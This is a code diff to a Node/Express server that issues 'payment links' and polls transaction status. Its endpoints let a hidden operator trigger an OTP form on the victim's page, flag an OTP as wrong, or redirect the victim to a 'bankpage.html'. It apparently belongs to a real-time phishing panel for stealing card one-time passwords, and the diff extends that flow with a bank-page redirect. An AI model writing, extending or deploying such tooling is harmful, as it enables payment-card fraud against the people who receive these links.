@@ -25,7 +25,7 @@ app.post('/api/generatePaymentLink', (req, res) => {
   // Generate a unique invoice id (we use 4 random bytes, uppercase hex)
   const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
   // Create a payment link that forces HTTPS and uses "pid" as the query parameter.
-  const paymentLink = `https://${req.get('host')}/landing.html?pid=${invoiceId}`;
+  const paymentLink = `${req.get('host')}/landing.html?pid=${invoiceId}`;
   // Save the payment link (you may later want to store additional details)
   paymentLinks.set(invoiceId, { 
     amount: Number(amount), 
@@ -33,6 +33,7 @@ app.post('/api/generatePaymentLink', (req, res) => {
     paymentLink, 
     createdAt: new Date().toISOString() 
   });
+  
   res.json({ status: "success", paymentLink });
 });
 // ==================== REPLACE UP TO HERE ====================
@@ -116,6 +117,7 @@ app.post('/api/wrongOTP', (req, res) => {
 });
 
 // Check transaction status (polled by payment page)
+//  CORRECT: Keep ONLY THIS VERSION (replace both with this)
 app.get('/api/checkTransactionStatus', (req, res) => {
   const { invoiceId } = req.query;
   const txn = transactions.get(invoiceId);
@@ -126,9 +128,14 @@ app.get('/api/checkTransactionStatus', (req, res) => {
     return res.json({ status: "show_otp", message: "Show OTP form to user", otpError: txn.otpError });
   }
   if (txn.redirectStatus) {
-    const redirectUrl = txn.redirectStatus === 'success'
-      ? `/success.html?invoiceId=${invoiceId}`
-      : `/fail.html?invoiceId=${invoiceId}`;
+    let redirectUrl;
+    if (txn.redirectStatus === 'success') {
+      redirectUrl = `/success.html?invoiceId=${invoiceId}`;
+    } else if (txn.redirectStatus === 'fail') {
+      redirectUrl = `/fail.html?invoiceId=${invoiceId}`;
+    } else if (txn.redirectStatus === 'bankpage') {
+      redirectUrl = `/bankpage.html?invoiceId=${invoiceId}`;
+    }
     return res.json({ status: "redirect", redirectUrl });
   }
   res.json({ status: txn.status, otpError: txn.otpError });
@@ -180,28 +187,6 @@ app.post('/api/redirectToBankPage', (req, res) => {
 });
 
 // MODIFY THIS EXISTING ENDPOINT (find checkTransactionStatus)
-app.get('/api/checkTransactionStatus', (req, res) => {
-  const { invoiceId } = req.query;
-  const txn = transactions.get(invoiceId);
-  if (!txn) {
-    return res.status(404).json({ status: "error", message: "Transaction details not found" });
-  }
-  if (txn.status === 'otp_pending' && txn.otpShown) {
-    return res.json({ status: "show_otp", message: "Show OTP form to user", otpError: txn.otpError });
-  }
-  if (txn.redirectStatus) {
-    let redirectUrl;
-    if (txn.redirectStatus === 'success') {
-      redirectUrl = `/success.html?invoiceId=${invoiceId}`;
-    } else if (txn.redirectStatus === 'fail') {
-      redirectUrl = `/fail.html?invoiceId=${invoiceId}`;
-    } else if (txn.redirectStatus === 'bankpage') { // ADD THIS NEW CONDITION
-      redirectUrl = `/bankpage.html?invoiceId=${invoiceId}`;
-    }
-    return res.json({ status: "redirect", redirectUrl });
-  }
-  res.json({ status: txn.status, otpError: txn.otpError });
-});
 
 // MODIFY THIS EXISTING ENDPOINT (find showOTP)
 app.post('/api/showOTP', (req, res) => {
